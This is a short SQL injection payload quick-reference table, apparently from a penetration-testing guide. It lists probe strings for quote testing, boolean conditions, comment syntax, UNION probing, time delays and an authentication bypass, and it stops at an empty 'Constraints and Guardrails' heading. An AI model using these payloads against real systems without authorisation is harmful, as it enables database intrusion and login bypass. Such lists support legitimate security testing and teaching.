# Common Payloads Quick List

| Purpose | Payload |
|---------|---------|
| Basic test | `'` or `"` |
| Boolean true | `OR 1=1--` |
| Boolean false | `AND 1=2--` |
| Comment (MySQL) | `#` or `-- ` |
| Comment (MSSQL) | `--` |
| UNION probe | `UNION SELECT NULL--` |
| Time delay | `AND SLEEP(5)--` |
| Auth bypass | `' OR '1'='1` |

## Constraints and Guardrails